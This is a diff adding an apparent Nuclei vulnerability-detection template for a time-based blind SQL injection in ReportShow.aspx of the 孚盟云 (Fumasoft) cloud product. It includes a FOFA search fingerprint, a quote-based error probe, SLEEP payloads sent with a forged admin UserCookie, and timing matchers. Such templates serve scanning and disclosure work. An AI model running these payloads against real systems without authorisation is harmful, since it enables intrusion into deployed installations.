@@ -1,0 +1,51 @@
+id: poc-yaml-fumasoft-reportshow-aspx-sqli
+info:
+  name: "孚盟云 ReportShow.aspx 存在 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 孚盟云
+  metadata:
+    finger: 孚盟云
+    fofa: app="孚盟软件-孚盟云"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/ActiveReport/ReportShow.aspx?templateId=' HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "your SQL syntax"
+
+  - raw:
+      - |
+        GET /m/Dingding/ActiveReport/ReportShow.aspx?templateId=1%27+AND+(SELECT+*+FROM+(SELECT+SLEEP(5))x)--+ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"admin","corpId":"1","loginUser":"admin"}
+      - |
+        GET /m/Dingding/ActiveReport/ReportShow.aspx?templateId=1%27+AND+(SELECT+*+FROM+(SELECT+SLEEP(8))x)--+ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"admin","corpId":"1","loginUser":"admin"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "导出PDF"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
